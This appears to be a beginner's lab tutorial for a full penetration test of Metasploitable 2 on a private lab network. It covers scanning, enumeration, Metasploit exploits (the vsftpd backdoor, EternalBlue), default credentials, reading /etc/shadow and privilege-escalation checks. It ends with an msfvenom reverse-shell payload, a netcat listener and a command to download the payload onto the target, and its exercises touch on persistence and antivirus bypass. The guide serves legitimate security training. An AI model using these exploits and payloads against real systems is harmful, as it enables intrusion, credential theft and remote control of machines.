# Quick Guide - Your First Pentest in the Lab

## Objective to Practice

We are going to do a complete pentest against Metasploitable 2 (192.168.56.200).

## Step 1: Reconnaissance

### Network Scanning
```bash
# View active hosts
nmap -sn 192.168.56.0/24

# Port scanning
nmap -sT -T4 192.168.56.200

# Service scanning
nmap -sV -sC 192.168.56.200
```

### Identify Services
```bash
# See what is running
nmap -sV -p- 192.168.56.200

# Expected result:
# 21/tcp   ftp
# 22/tcp   ssh
# 23/tcp   telnet
# 25/tcp   smtp
# 80/tcp   http
# 139/tcp  netbios-ssn
# 445/tcp  microsoft-ds
# 3306/tcp mysql
```

## Step 2: Enumeration

### HTTP (Port 80)
```bash
# Browse to the web server
firefox http://192.168.56.200

# Scanning with Nikto
nikto -h http://192.168.56.200

# Find directories
dirb http://192.168.56.200
```

### SMB (Port 445)
```bash
# Enumerate shares
enum4linux -a 192.168.56.200

# List users
enum4linux -U 192.168.56.200
```

### FTP (Port 21)
```bash
# Connect with anonymous
ftp 192.168.56.200
# Username: anonymous
# Password: (empty)

# List files
ls -la
```

## Step 3: Exploitation

### Option A: Metasploit - vsftpd Backdoor
```bash
msfconsole

# Search for exploit
search vsftpd

# Use exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.200
exploit

# Obtain shell
id
whoami
```

### Option B: Metasploit - EternalBlue (if Windows were available)
```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.203
set LHOST 192.168.56.100
exploit
```

### Option C: Manual - Telnet
```bash
# Connect via telnet
telnet 192.168.56.200

# Default Metasploitable credentials:
# username: msfadmin
# password: msfadmin
```

## Step 4: Post-Exploitation

### Gather Information
```bash
# If you have a shell
uname -a
cat /etc/passwd
cat /etc/shadow
ifconfig
```

### Privilege Escalation
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo
sudo -l

# Find files with special permissions
find / -writable -type f 2>/dev/null
```

## Step 5: Documentation

### Create Report
1. Copy the findings template
2. Document each step
3. Include screenshots
4. Classify by severity

### Report Structure
```
docs/hallazgos/
├── 2024-XX-XX-metasploitable-pentest/
│   ├── resumen-ejecutivo.md
│   ├── hallazgo-1-vsftpd.md
│   ├── hallazgo-2-telnet.md
│   ├── hallazgo-3-smb.md
│   └── evidencia/
│       ├── screenshot-01.png
│       └── logs.txt
```

## Additional Exercises

### For Beginners
1. Find all credentials in Metasploitable
2. Access phpMyAdmin
3. Exploit the SQL Injection vulnerability in DVWA

### For Intermediates
1. Pivot from Metasploitable to other VMs
2. Create a persistent payload
3. Use Meterpreter for lateral movement

### For Advanced
1. Combine multiple vulnerabilities
2. Bypass antivirus with encoding
3. Create an Active Directory lab

## Useful Commands

```bash
# Generate payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o payload.elf

# Listen for connections
nc -lvp 4444

# Transfer files
python3 -m http.server 8080  # On Kali
wget http://192.168.56.100:8080/payload.elf  # On target

# Proxychains
proxychains nmap -sT 192.168.57.0/24
```

## Tips

1. **Always document** every step and finding
2. **Do not destroy** the targets — they are for practice
3. **Experiment** — try different tools
4. **Read the errors** — they give you valuable information
5. **Search Google** — every error has a solution